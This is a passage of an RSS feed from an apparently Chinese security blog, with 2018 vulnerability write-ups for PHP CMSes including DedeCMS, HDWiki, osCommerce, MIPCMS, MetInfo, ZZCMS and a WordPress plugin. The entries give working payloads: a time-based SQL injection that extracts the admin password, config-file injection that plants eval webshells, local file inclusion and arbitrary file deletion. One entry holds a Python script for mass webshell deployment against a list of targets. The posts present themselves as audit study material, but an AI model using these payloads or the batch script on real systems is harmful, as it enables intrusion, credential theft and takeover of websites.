+0x03 任意文件上传漏洞 漏洞复现  登录后台，点击模块管理   新建一个测试文件然后压缩  然后导入模块 可以看到已经上传到了/data/cache/的目录下面了：  访问文件   漏洞分析 漏洞代码在framework/admin/modulec_control.php 642行。 大家可以详细的分析这个流程，主要漏洞的代码是 $this-&amp;gt;lib(&#39;phpzip&#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,$this-&amp;gt;dir_root.&#39;data/cache/&#39;); 没有做任何的过滤，直接把zip原样解压缩到/data/cache/的目录下面。
+/** * 模块导入 * @变量 zipfile 指定的ZIP文件地址 **/ public function import_f() { $zipfile = $this-&amp;gt;get(&amp;#39;zipfile&amp;#39;); if(!$zipfile){ $this-&amp;gt;lib(&amp;#39;form&amp;#39;)-&amp;gt;cssjs(array(&amp;#39;form_type&amp;#39;=&amp;gt;&amp;#39;upload&amp;#39;)); $this-&amp;gt;addjs(&amp;#39;js/webuploader/admin.upload.js&amp;#39;); $this-&amp;gt;view(&amp;#39;module_import&amp;#39;); } if(strpos($zipfile,&amp;#39;..&amp;#39;) !== false){ $this-&amp;gt;error(P_Lang(&amp;#39;不支持带..上级路径&amp;#39;)); } if(!file_exists($this-&amp;gt;dir_root.$zipfile)){ $this-&amp;gt;error(P_Lang(&amp;#39;ZIP文件不存在&amp;#39;)); } $this-&amp;gt;lib(&amp;#39;phpzip&amp;#39;)-&amp;gt;unzip($this-&amp;gt;dir_root.$zipfile,$this-&amp;gt;dir_root.&amp;#39;data/cache/&amp;#39;); if(!file_exists($this-&amp;gt;dir_root.&amp;#39;data/cache/module.xml&amp;#39;)){ $this-&amp;gt;error(P_Lang(&amp;#39;导入模块失败，请检查解压缩是否成功&amp;#39;)); } $rs = $info = $this-&amp;gt;lib(&amp;#39;xml&amp;#39;)-&amp;gt;read($this-&amp;gt;dir_root.&amp;#39;data/cache/module.xml&amp;#39;,true); if(!$rs){ $this-&amp;gt;error(P_Lang(&amp;#39;XML内容解析异常&amp;#39;)); } $tmp = $rs; if(isset($tmp[&amp;#39;_fields&amp;#39;])){ unset($tmp[&amp;#39;_fields&amp;#39;]); } $insert_id = $this-&amp;gt;model(&amp;#39;module&amp;#39;)-&amp;gt;save($tmp); if(!</description>
+    </item>
+    
+    <item>
+      <title>DedeCMS V5.7后台过滤不当导致Getshell(每周一洞)</title>
+      <link>https://getshe11.com/posts/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/</link>
+      <pubDate>Fri, 27 Jul 2018 14:14:56 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/</guid>
+      <description>0x01 前言 前两天看到七月火表哥再先知发的一篇审计文章，感觉不错，是dedecms的getshell。就分析了一下，顺便写一篇文章学习。
+0x02 环境 环境和之前的一篇文章一样可以作为参考： https://getpass.cn/2018/03/10/DedeCMS%20V5.7%20SP2%20Background%20Getshell%20Code%20Execution%20Vulnerability/
+0x03 复现漏洞  进入后台添加广告的地方：http://sb.com/dede/ad_main.php 在添加页面加上我们的代码：--&amp;gt;&amp;lt;?php phpinfo();?&amp;gt;&amp;lt;!--  然后点击查看代码  访问执行代码   0x04 漏洞分析 dede\ad_add.php,代码可以读一遍，插入数据库的时候并没有对危险函数进行处理。
+if($dopost==&amp;#34;save&amp;#34;) { csrf_check(); //timeset tagname typeid normbody expbody  $tagname = trim($tagname); $row = $dsql-&amp;gt;GetOne(&amp;#34;SELECT typeid FROM #@__myad WHERE typeid=&amp;#39;$typeid&amp;#39; AND tagname LIKE &amp;#39;$tagname&amp;#39;&amp;#34;); if(is_array($row)) { ShowMsg(&amp;#34;在相同栏目下已经存在同名的标记！&amp;#34;,&amp;#34;-1&amp;#34;); exit(); } $starttime = GetMkTime($starttime); $endtime = GetMkTime($endtime); $link = addslashes($normbody[&amp;#39;link&amp;#39;]); if($normbody[&amp;#39;style&amp;#39;]==&amp;#39;code&amp;#39;) { $normbody = addslashes($normbody[&amp;#39;htmlcode&amp;#39;]); } else if($normbody[&amp;#39;style&amp;#39;]==&amp;#39;txt&amp;#39;) { $normbody = &amp;#34;&amp;lt;a href=\&amp;#34;{$link}\&amp;#34;font-size=\&amp;#34;{$normbody[&amp;#39;size&amp;#39;]}\&amp;#34;color=\&amp;#34;{$normbody[&amp;#39;color&amp;#39;]}\&amp;#34;&amp;gt;{$normbody[&amp;#39;title&amp;#39;]}&amp;lt;/a&amp;gt;&amp;#34;; } else if($normbody[&amp;#39;style&amp;#39;]==&amp;#39;img&amp;#39;) { if(empty($normbody[&amp;#39;width&amp;#39;])) { $width = &amp;#34;&amp;#34;; } else { $width = &amp;#34; width=\&amp;#34;{$normbody[&amp;#39;width&amp;#39;]}\&amp;#34;&amp;#34;; } if (empty($normbody[&amp;#39;height&amp;#39;])) { $height = &amp;#34;&amp;#34;; } else { $height = &amp;#34;height=\&amp;#34;{$normbody[&amp;#39;height&amp;#39;]}\&amp;#34;&amp;#34;; } $normbody = &amp;#34;&amp;lt;a href=\&amp;#34;{$link}\&amp;#34;&amp;gt;&amp;lt;img src=\&amp;#34;{$normbody[&amp;#39;url&amp;#39;]}\&amp;#34;$width$heightborder=\&amp;#34;0\&amp;#34;/&amp;gt;&amp;lt;/a&amp;gt;&amp;#34;; } else { if(empty($normbody[&amp;#39;width&amp;#39;])) { $width = &amp;#34;&amp;#34;; } else { $width = &amp;#34; width=\&amp;#34;{$normbody[&amp;#39;width&amp;#39;]}\&amp;#34;&amp;#34;; } if (empty($normbody[&amp;#39;height&amp;#39;])) { $height = &amp;#34;&amp;#34;; } else { $height = &amp;#34;height=\&amp;#34;{$normbody[&amp;#39;height&amp;#39;]}\&amp;#34;&amp;#34;; } $normbody = &amp;#34;&amp;lt;object classid=\&amp;#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\&amp;#34;codebase=\&amp;#34;http://download.</description>
+    </item>
+    
+    <item>
+      <title>HDWiki v6.0最新版referer注入漏洞(每周一洞)</title>
+      <link>https://getshe11.com/posts/hdwiki-v6.0_latest_version_of_referer_injection_vulnerability/</link>
+      <pubDate>Sun, 22 Jul 2018 17:13:30 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/hdwiki-v6.0_latest_version_of_referer_injection_vulnerability/</guid>
+      <description>0x01 前言 经拖稿一个月了，差了四篇文章没补回来， 现在都补上，虽然说这样没有坚持的按时写下去，但是只要记得要做这个事情就行了，不能中途而废。这个漏洞比较鸡肋，搁现在估计都没戏了，但是这个漏洞的思路可以学习下，积累经验。
+0x02 环境搭建 6.0可以在官网下载：http://kaiyuan.hudong.com/download/ 在文章底部也会附上源码，搭建就不详细说明了，在我的其他文章也有搭建的详细步骤。用到的集成环境是PHPstudy，PHP版本是5.3，开启GPC。
+0x03 漏洞利用 1. 注册账号 http://sb.com/index.php?user-register
+2. 截获数据包 http://sb.com/index.php?user-login, 用burp或者其他工具截取数据包。
+3. 执行Payload 在数据包下面加上referer：referer:&#39; where if((substr((select password from wiki_user where username=&#39;admin&#39;),1,1))=&#39;e&#39;,sleep(5),0)# 看到burp的右下角时间比没有加上payload的时候多了5s，证明漏洞利用成功。
+0x04 漏洞分析 文件control/user.php的110行dologin()函数，为什么要登录用户才有效呢，因为$_ENV[&#39;user&#39;]这里检测了cookies，所以没有用户登录是不能执行不成功的。想了解的可以进去读一下这个代码，主要存在注入的地方是在$_ENV[&#39;user&#39;]-&amp;gt;add_referer();这里。
+function dologin(){ $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_server(&amp;#39;login&amp;#39;,&amp;#39;1&amp;#39;); if(!isset($this-&amp;gt;post[&amp;#39;submit&amp;#39;])){ $this-&amp;gt;view-&amp;gt;assign(&amp;#39;checkcode&amp;#39;,isset($this-&amp;gt;setting[&amp;#39;checkcode&amp;#39;])?$this-&amp;gt;setting[&amp;#39;checkcode&amp;#39;]:0); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;add_referer(); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_server(&amp;#39;login&amp;#39;,&amp;#39;2&amp;#39;); $_ENV[&amp;#39;user&amp;#39;]-&amp;gt;passport_client(&amp;#39;login&amp;#39;); if (!isset($this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;])) {$this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;] = 3;} if (!isset($this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;])) {$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;] = 15;} $loginTip2 = str_replace(array(&amp;#39;3&amp;#39;,&amp;#39;15&amp;#39;),array($this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;],$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;]),$this-&amp;gt;view-&amp;gt;lang[&amp;#39;loginTip2&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;name_min_length&amp;#39;,$this-&amp;gt;setting[&amp;#39;name_min_length&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;name_max_length&amp;#39;,$this-&amp;gt;setting[&amp;#39;name_max_length&amp;#39;]); $this-&amp;gt;view-&amp;gt;assign(&amp;#39;loginTip2&amp;#39;,$loginTip2); //$this-&amp;gt;view-&amp;gt;display(&amp;#39;login&amp;#39;); 	$_ENV[&amp;#39;block&amp;#39;]-&amp;gt;view(&amp;#39;login&amp;#39;); }else{ 继续跟进add_referer()函数的分析，model\user.class.php的41行，这里判断了HTTP_REFERER是否为真然后执行下面内容，可以看到把$_SERVER[&#39;HTTP_REFERER&#39;]带入UPDATE语句，但是有一个haddslashes函数的过滤。
+function add_referer(){ if($_SERVER[&amp;#39;HTTP_REFERER&amp;#39;]){ $this-&amp;gt;db-&amp;gt;query(&amp;#34;UPDATE &amp;#34;.DB_TABLEPRE.&amp;#34;session SET referer =&amp;#39;&amp;#34;.string::haddslashes($_SERVER[&amp;#39;HTTP_REFERER&amp;#39;]).&amp;#34;&amp;#39; WHERE sid=&amp;#39;&amp;#34;.base::hgetcookie(&amp;#39;sid&amp;#39;).&amp;#34;&amp;#39;&amp;#34;); } } 我们进入haddslashes()函数，在lib\string.</description>
+    </item>
+    
+    <item>
+      <title>osCommerce 2.3.4.1 - 远程代码执行漏洞（每日一洞）</title>
+      <link>https://getshe11.com/posts/oscommerce-2.3.4.1-remote-code-execution-vulnerability/</link>
+      <pubDate>Mon, 02 Apr 2018 11:18:58 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/oscommerce-2.3.4.1-remote-code-execution-vulnerability/</guid>
+      <description>0x01 前言 好几天没有写了，前两天又去Boom了，差点没缓过来。今天在exploit-db逛看到一个洞，也是install的地方，想去利用上次那个远程数据库技巧来尝试下，发现这个洞根本用不到，不过新手可以学习下哈，也可以收藏下，因为有时候在ctf线下赛的时候官方会拿一些国外的程序给你玩，最近也在写python的漏洞利用工具，欢迎关注我的github。
+0x02 环境 程序源码下载：https://www.exploit-db.com/apps/ce2796b352d6e0fb4e9f03866ae98541-oscommerce-2.3.4.zip Web环境:Windows 10+Apache2+PHP5.6+MySQL
+0x03 漏洞利用过程 1.我们先正常安装这个程序 2.执行我们的payload GET:http://127.0.0.1/oscommerce/install/install.php?step=4 POST:DIR_FS_DOCUMENT_ROOT=./&amp;amp;DB_DATABASE=&#39;);phpinfo();/* 3.访问写入代码的文件 GET:http://127.0.0.1/oscommerce/install/includes/configure.php  写入的内容： 0x04 漏洞代码分析过程 漏洞文件出现的位置是：\install\templates\pages\install_4.php
+说起这个国外写的程序还没我们国内的严谨，安装完没有写入install.lock或者像Joomla（最近正在写）一样强制让客户删除安装文件。
+直接看代码吧，过程也不算太复杂。这里用到了PHP以下的函数$HTTP_POST_VARS这个函数类似与PHP4及以上的$_POST。这里是接收参数的地方。 最重要还是这里，因为如果没有传入DIR_FS_DOCUMENT_ROOT的话下面写入文件就无法进行了。
+0x05 Payload构造 DIR_FS_DOCUMENT_ROOT是必须的了，让它等于根目录./就行了。 写入恶意代码就用DB_DATABASE吧，我们先用闭合&#39;);前面，然后再写入phpinfo();,后面它会自动加上&#39;);，exploit-db上面是直接加上/*注释掉的，因为这个程序很奇怪，先一遍在install的配置文件，然后再写到程序里面的配置文件，所以就不会顾虑网站会崩的问题了。 payload： post 模式DIR_FS_DOCUMENT_ROOT=./&amp;amp;DB_DATABASE=&#39;);phpinfo();/*
+0x06 用Python编写批量getshell脚本 我觉得你们应该读得懂这个代码吧，如果有需要的话我以后会把这里面的流程解释一遍。
+#!/usr/bin/env #author:F0rmat import sys import requests import threading def exploit(target): if sys.argv[1]== &amp;#34;-f&amp;#34;: target=target[0] url1=target+&amp;#34;/install/install.php?step=4&amp;#34; data={ &amp;#39;DIR_FS_DOCUMENT_ROOT&amp;#39;: &amp;#39;./&amp;#39;, &amp;#39;DB_DATABASE&amp;#39;:&amp;#34;\&amp;#39;);@eval($_POST[&amp;#39;f0rmat&amp;#39;]);echo &amp;#39;F0rmat&amp;#39;;/*&amp;#34; } url2=target+&amp;#34;install/includes/configure.php&amp;#34; try: requests.post(url1,data=data) verify = requests.get(url2, timeout=3) if &amp;#34;F0rmat&amp;#34; in verify.content: print &amp;#39;Write success,shell url:&amp;#39;,url2,&amp;#39;pass:f0rmat&amp;#39; with open(&amp;#34;success.</description>
+    </item>
+    
+    <item>
+      <title>MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)</title>
+      <link>https://getshe11.com/posts/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/</link>
+      <pubDate>Mon, 26 Mar 2018 01:09:26 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/mipcms-v3.1.0-remotely-writing-the-configuration-file-getshell/</guid>
+      <description>0x01 前言 今天翻了下CNVD，看到了一个MIPCMS的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。 看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过install.lock进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。 想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇ZZCMS 8.2任意文件删除至Getshell的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。
+0x02 环境 程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip Web环境:Deepin Linux+Apache2+PHP5.6+MySQL（192.168.1.101） 远程数据库服务器:Windows 10 x64（192.168.1.102）
+0x03 漏洞利用过程   我们先正常安装程序   在远程数据库服务器上面开启远程访问，然后在上面建立一个名为test&#39;,1=&amp;gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&amp;gt;&#39;数据库。   浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost POST:
+  username=admin&amp;amp;password=admin&amp;amp;rpassword=admin&amp;amp;dbport=3306&amp;amp;dbname=test&#39;,1=&amp;gt;eval(file_get_contents(&#39;php://input&#39;)),&#39;2&#39;=&amp;gt;&#39;&amp;amp;dbhost=192.168.1.102&amp;amp;dbuser=root&amp;amp;dbpw=root 记得里面的数据库对应上你远程数据库服务器的信息！ 可以看到一句把eval函数写到了配置文件里面了
+4. 执行代码，具体原理我会在后面构造poc的再详细讲解 浏览器访问：http://www.getpass.test/system/config/database.php POST：phpinfo(); 0x04 框架知识补充 还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003
+首先我们现在thinkPHP的配置文件/system/config/config.php里面修改下面这两个为true 然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个小绿帽，点击就可以看到文件的加载流程。 这里有很多文件会预加载，我们主要看它的路由文件Route.php 我们可以看到，这里检查了install.lock文件存不存在，如果不存在就会跳转到安装的界面进行安装。 0x05 漏洞代码分析过程 /app/install/controller/Install.php问题出现在这个文件，它里面的就在index这里检查的install.lock的存在，但是在installPost这个方法里面却没有检查，也没有做关联，在install.html里面直接就跳过了，从而导致了程序重装。 下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：
+ 一个是遍历数据库内容那里，我输出了$matches截图这个内容给你们好理解。  再一个是配置文件的替换，读到$conf = str_replace(&amp;quot;#{$key}#&amp;quot;, $value, $conf);这句的时候我顺便截图了一个配置的内容。   public function installPost(Request $request) { header(&amp;#39;Access-Control-Allow-Origin: *&amp;#39;); header(&amp;#39;Access-Control-Allow-Credentials: true&amp;#39;); header(&amp;#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&amp;#39;); header(&amp;#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&amp;#39;); if (Request::instance()-&amp;gt;isPost()) {//判断是否有post的数据  $dbconfig[&amp;#39;type&amp;#39;]=&amp;#34;mysql&amp;#34;;//定义数据库类型  $dbconfig[&amp;#39;hostname&amp;#39;]=input(&amp;#39;post.</description>
+    </item>
+    
+    <item>
+      <title>Wordpress Plugin Site Editor 1.1.1 - 本地文件包含漏洞分析(每日一洞)</title>
+      <link>https://getshe11.com/posts/wordpress-plugin-site-editor-1.1.1-local-file-inclusion-analysis/</link>
+      <pubDate>Sun, 25 Mar 2018 13:45:14 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/wordpress-plugin-site-editor-1.1.1-local-file-inclusion-analysis/</guid>
+      <description>0x01 前言 大概有一周没有写文章了，比赛完嗨皮了两天，喝酒喝到半夜回来继续看文章，看到了exploit的关于wordpress一个漏洞信息CVE-2018-7422 ，下面就来分析一下这个本地文件包含的漏洞代码，如果权限够的话是可以读取系统的一些敏感的文件例如:/etc/passwd、/etc/shadow等。
+0x02 漏洞复现 环境 攻击机：Deepin Linux x64 Wordpress服务器：Windows 10 x64 (phpstudy) 搭建环境有些要注意的，例如上传插件是大于2M的，要php.ini里面修改下再重启下就行了。 Proof of Concept http://&amp;lt;host&amp;gt;/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=要读取的文件绝对路径或者相对路径 结果 0x03 代码分析 文件在wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php 
+你可以去插件的官方github看，前天的漏洞，现在还没修复 https://github.com/SiteEditor/editor/blob/master/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php
+这个漏洞代码比较简单容易，新手也很适合理解。 整合代码执行流程就是判断文件是否存在，存在就require_once包含，不存在就报错。 这里有一个点，为什么说是只能本地文件包含呢，不能用远程包含吗？如果远程文件包含不就可以利用php的协议来getshell了吗？ 因为file_exists函数只能判断本地文件，如果是远程文件的话就会判断文件不存在了。
+if( isset( $_REQUEST[&#39;ajax_path&#39;] ) &amp;amp;&amp;amp; is_file( $_REQUEST[&#39;ajax_path&#39;] ) &amp;amp;&amp;amp; file_exists( $_REQUEST[&#39;ajax_path&#39;] ) ){ require_once $_REQUEST[&#39;ajax_path&#39;]; }else{ echo json_encode( array( &#39;success&#39; =&amp;gt; false, &#39;message&#39; =&amp;gt; &amp;quot;Error: didn&#39;t load shortcodes pattern file&amp;quot;, ) ); return ; } 0x04 结束 再给我点时间，嗨皮过头了还没缓过神来，看过大表哥对我文章的评价，我会改进文章的一些细节，展现更好的给大家。
+0x05 参考 插件源码下载：https://pan.</description>
+    </item>
+    
+    <item>
+      <title>DedeCMS V5.7 SP2后台Getshell 代码执行漏洞(每日一洞)</title>
+      <link>https://getshe11.com/posts/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</link>
+      <pubDate>Sat, 10 Mar 2018 00:11:57 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</guid>
+      <description>前言 这两天费劲脑力去撩小姐姐，感觉好难啊，还不如审计代码。  环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： PhpStorm 2017.1.1
+复现 漏洞利用  首先访问域名 + /dede/tpl.php?action=upload，在这个页面的源代码中获取到token值。  访问以下地址： 域名 + /dede/tpl.php?filename=shell.lib.php&amp;amp;action=savetagfile&amp;amp;content=&amp;lt;?php%20phpinfo();?&amp;gt;&amp;amp;token=刚才的token值  访问shell的地址：  域名 + /include/taglib/shell.lib.php
+漏洞分析 代码位置和代码 位置： dedecms\dede\tpl.php 代码：
+if(empty($filename)) $filename = &amp;#39;&amp;#39;; $filename = preg_replace(&amp;#34;#[\/\\\\]#&amp;#34;, &amp;#39;&amp;#39;, $filename); 中间省略。。。。。。。。。 else if($action==&amp;#39;savetagfile&amp;#39;) { csrf_check(); if(!preg_match(&amp;#34;#^[a-z0-9_-]{1,}\.lib\.php$#i&amp;#34;, $filename)) { ShowMsg(&amp;#39;文件名不合法，不允许进行操作！&amp;#39;, &amp;#39;-1&amp;#39;); exit(); } require_once(DEDEINC.&amp;#39;/oxwindow.class.php&amp;#39;); $tagname = preg_replace(&amp;#34;#\.lib\.php$#i&amp;#34;, &amp;#34;&amp;#34;, $filename); $content = stripslashes($content); $truefile = DEDEINC.</description>
+    </item>
+    
+    <item>
+      <title>MetInfo5.3.19安装过程过滤不严导致Getshell(每日一洞)</title>
+      <link>https://getshe11.com/posts/metinfo5.3.19-installation-process-is-not-strict-lead-to-getshell/</link>
+      <pubDate>Tue, 06 Mar 2018 22:41:35 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/metinfo5.3.19-installation-process-is-not-strict-lead-to-getshell/</guid>
+      <description>前言 前几天在先知看到的漏洞，就很想写个分析过程了的，因为比赛培训和在审计一个CMS拖到了今天。
+环境 Web： phpstudy System： Windows 7 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： PhpStorm 2017.3.3、Seay源代码审计系统
+任意文件删除漏洞 复现 POC 前提：需要由对应的删除权限 flienamecsv代表要删除的文件
+http://xxx.com/admin/app/batch/csvup.php?fileField=1&amp;amp;flienamecsv=../../../config/install.lock
+执行结果 代码位置和漏洞代码 代码位置 \admin\app\batch\csvup.php
+漏洞代码 &amp;lt;?php $depth=&amp;#39;../&amp;#39;; require_once $depth.&amp;#39;../login/login_check.php&amp;#39;; setlocale(LC_ALL,array(&amp;#39;zh_CN.gbk&amp;#39;,&amp;#39;zh_CN.gb2312&amp;#39;,&amp;#39;zh_CN.gb18030&amp;#39;)); $codeold=&amp;#39;gbk&amp;#39;; $codenew=&amp;#39;utf-8&amp;#39;; $classflie=explode(&amp;#39;_&amp;#39;,$fileField); $classflie=explode(&amp;#39;-&amp;#39;,$classflie[count($classflie)-1]); $class1=$classflie[0]; $class2=$classflie[1]; $class3=$classflie[2]; $class=$class3?$class3:($class2?$class2:$class1); $classcsv=$db-&amp;gt;get_one(&amp;#34;select * from $met_columnwhere id=$class&amp;#34;); if(!$classcsv){ metsave(&amp;#34;../app/batch/contentup.php?anyid=$anyid&amp;amp;lang=$lang&amp;#34;,$lang_csvnocolumn,$depth); } $table=moduledb($classcsv[&amp;#39;module&amp;#39;]); $file = fopen($flienamecsv,&amp;#39;r&amp;#39;); $fdata=fgetcsv($file); foreach($fdata as $key=&amp;gt;$val){ if(iconv($codeold,$codenew,$val)==$lang_columnhtmlname){$staticnum=$key;} } $numcsv=0; while ($data = fgetcsv($file)){ $staticone=iconv($codeold,$codenew,$data[$staticnum]); if($staticone!=NULL){ $static[$numcsv+1]=$staticone; $static_copy[]=$staticone; } $dataqrray[]=$data; $numcsv++; } fclose($file); @file_unlink($flienamecsv); 分析过程  开始的时候我就在找$fileField和$flienamecsv这两个变量是怎么get过来的，分析了包含include/common.</description>
+    </item>
+    
+    <item>
+      <title>ZZCMS8.2任意文件删除至getshell(每日一洞)</title>
+      <link>https://getshe11.com/posts/zzcms8.2-any-file-deleted-to-getshell/</link>
+      <pubDate>Tue, 06 Mar 2018 22:41:35 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/zzcms8.2-any-file-deleted-to-getshell/</guid>
+      <description>前言 今天就审计一个洞，时间不够用了。明天或者周末看看有空有拿一些难的漏洞来审计复现一下。
+环境 Web： Apache+PHP+MySql System： Ubuntu Browser： Firefox Quantum
+漏洞详情 任意文件删除 文件位置：/user/licence_save.php
+代码：
+$title=trim($_POST[&amp;#34;title&amp;#34;]);	$img=trim($_POST[&amp;#34;img&amp;#34;]); if ($_GET[&amp;#34;action&amp;#34;]==&amp;#34;add&amp;#34;){ query(&amp;#34;Insert into zzcms_licence(title,img,editor,sendtime) values(&amp;#39;$title&amp;#39;,&amp;#39;$img&amp;#39;,&amp;#39;$username&amp;#39;,&amp;#39;&amp;#34;.date(&amp;#39;Y-m-d H:i:s&amp;#39;).&amp;#34;&amp;#39;)&amp;#34;) ; }elseif ($_GET[&amp;#34;action&amp;#34;]==&amp;#34;modify&amp;#34;){ $oldimg=trim($_POST[&amp;#34;oldimg&amp;#34;]); $id=$_POST[&amp;#34;id&amp;#34;]; if ($id==&amp;#34;&amp;#34; || is_numeric($id)==false){ $FoundErr=1; $ErrMsg=&amp;#34;&amp;lt;li&amp;gt;&amp;#34;. $f_array[0].&amp;#34;&amp;lt;/li&amp;gt;&amp;#34;; WriteErrMsg($ErrMsg); }else{ query(&amp;#34;update zzcms_licence set title=&amp;#39;$title&amp;#39;,img=&amp;#39;$img&amp;#39;,sendtime=&amp;#39;&amp;#34;.date(&amp;#39;Y-m-d H:i:s&amp;#39;).&amp;#34;&amp;#39;,passed=0 where id=&amp;#39;$id&amp;#39;&amp;#34;); if ($oldimg&amp;lt;&amp;gt;$img &amp;amp;&amp;amp; $oldimg&amp;lt;&amp;gt;&amp;#34;/image/nopic.gif&amp;#34;){ $f=&amp;#34;../&amp;#34;.$oldimg; if (file_exists($f)){ unlink($f); } $fs=&amp;#34;../&amp;#34;.str_replace(&amp;#34;.&amp;#34;,&amp;#34;_small.&amp;#34;,$oldimg).&amp;#34;&amp;#34;; if (file_exists($fs)){ unlink($fs);	} }	} }  我们可以看到如果从$_GET传值过来如果是modify，那么就执行下面的内容。 $oldimg=trim($_POST[&amp;quot;oldimg&amp;quot;]);把$_POST过来的oldimg用trim去点两边的空格之后赋值给$oldimg 接下来这些不用理会，直到if ($oldimg&amp;lt;&amp;gt;$img &amp;amp;&amp;amp; $oldimg&amp;lt;&amp;gt;&amp;quot;/image/nopic.gif&amp;quot;)这句判断，$img是上面$_POST过来的，填其他值就不等于了，然后我们的文件名也不会等于/image/nopic.gif $f=&amp;quot;../&amp;quot;.$oldimg;跳到主目录然后接上我们的要传过来的文件路径和文件名 if (file_exists($f)){unlink($f);}这句file_exists判断文件是否存在，存在就用unlink删除文件。 中间没有做任何的过滤。。。  构造POC 我们要把这些$_POST和$_GET的值都加上，要不然PHP会报错不执行下去。</description>
+    </item>
+    
+    <item>
+      <title>ZZCMS8.2任意用户密码修改漏洞代码分析(每日一洞)</title>
+      <link>https://getshe11.com/posts/zzcms-any-user-password-changes-loopholes-code-points/</link>
+      <pubDate>Tue, 06 Mar 2018 00:03:07 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/zzcms-any-user-password-changes-loopholes-code-points/</guid>
+      <description>前言 这几天感冒很难受，再加上比赛的培训，估计后面会两天一篇。 这个小型CMS前段时间我也挖到了很多洞，这次就找seebug发的一篇来做审计。
+环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
+漏洞详情 代码位置和代码  位置 \one\getpassword.php 代码  &amp;lt;?php if(!isset($_SESSION)){session_start();} include(&amp;#34;../inc/conn.php&amp;#34;); include(&amp;#34;../inc/top2.php&amp;#34;); include(&amp;#34;../inc/bottom.php&amp;#34;); $action = isset($_POST[&amp;#39;action&amp;#39;])?$_POST[&amp;#39;action&amp;#39;]:&amp;#34;&amp;#34;; $file=&amp;#34;../template/&amp;#34;.$siteskin.&amp;#34;/getpassword.htm&amp;#34;; if (file_exists($file)==false){ WriteErrMsg($file.&amp;#39;模板文件不存在&amp;#39;); exit; } $fso = fopen($file,&amp;#39;r&amp;#39;); $strout = fread($fso,filesize($file)); $stepall=strbetween($strout,&amp;#34;{step1}&amp;#34;,&amp;#34;{/step4}&amp;#34;); $step1=strbetween($strout,&amp;#34;{step1}&amp;#34;,&amp;#34;{/step1}&amp;#34;); $step2=strbetween($strout,&amp;#34;{step2}&amp;#34;,&amp;#34;{/step2}&amp;#34;); $step3=strbetween($strout,&amp;#34;{step3}&amp;#34;,&amp;#34;{/step3}&amp;#34;); $step4=strbetween($strout,&amp;#34;{step4}&amp;#34;,&amp;#34;{/step4}&amp;#34;); if ($action==&amp;#34;&amp;#34;){ $strout=str_replace(&amp;#34;{step1}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{/step1}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{step2}&amp;#34;.$step2.&amp;#34;{/step2}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{step3}&amp;#34;.$step3.&amp;#34;{/step3}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; $strout=str_replace(&amp;#34;{step4}&amp;#34;.$step4.&amp;#34;{/step4}&amp;#34;,&amp;#34;&amp;#34;,$strout) ; } if ($action==&amp;#34;step1&amp;#34;){ $username = isset($_POST[&amp;#39;username&amp;#39;])?$_POST[&amp;#39;username&amp;#39;]:&amp;#34;&amp;#34;; $_SESSION[&amp;#39;username&amp;#39;]=$username; checkyzm($_POST[&amp;#34;yzm&amp;#34;]); $rs=query(&amp;#34;select mobile,email from zzcms_user where username=&amp;#39;&amp;#34; .</description>
+    </item>
+    
+    <item>
